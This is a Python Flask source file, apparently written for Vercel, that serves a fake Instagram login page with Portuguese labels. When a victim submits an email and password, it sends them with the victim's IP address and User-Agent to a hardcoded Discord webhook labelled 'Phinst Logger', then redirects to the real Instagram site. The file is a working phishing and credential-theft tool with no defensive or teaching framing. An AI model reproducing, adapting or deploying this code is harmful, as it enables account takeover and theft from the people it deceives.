from flask import Flask, request, redirect, Response
import requests

app = Flask(__name__)

WEBHOOK = "https://discord.com/api/webhooks/1356844204608721017/GB-N9jMt__CmHGiFaJUAOg_doQBZTNH0GjOoTwekMa_SBmIff-NKyk91FUDDQuhfCQE2"

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        ip = request.headers.get("x-forwarded-for", request.remote_addr)
        user_agent = request.headers.get("User-Agent")

        data = {
            "username": "Phinst Logger",
            "embeds": [
                {
                    "title": "📥 Credenciais Recebidas",
                    "color": 0x00FFFF,
                    "fields": [
                        {"name": "Login", "value": email, "inline": True},
                        {"name": "Senha", "value": password, "inline": True},
                        {"name": "IP", "value": ip},
                        {"name": "User-Agent", "value": user_agent}
                    ]
                }
            ]
        }

        try:
            requests.post(WEBHOOK, json=data)
        except Exception as e:
            print("[!] Webhook erro:", e)

        return redirect("https://www.instagram.com")

    # HTML direto, sem template
    html = """
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <meta charset="UTF-8">
        <title>Instagram Fake</title>
    </head>
    <body style="font-family:sans-serif; padding:40px;">
        <h2>Instagram Login</h2>
        <form method="POST" action="/">
            <input name="email" placeholder="Email ou usuário" required><br><br>
            <input name="password" type="password" placeholder="Senha" required><br><br>
            <button type="submit">Entrar</button>
        </form>
    </body>
    </html>
    """
    return Response(html, mimetype='text/html')

# necessário para Vercel
handler = app
app.debug = True
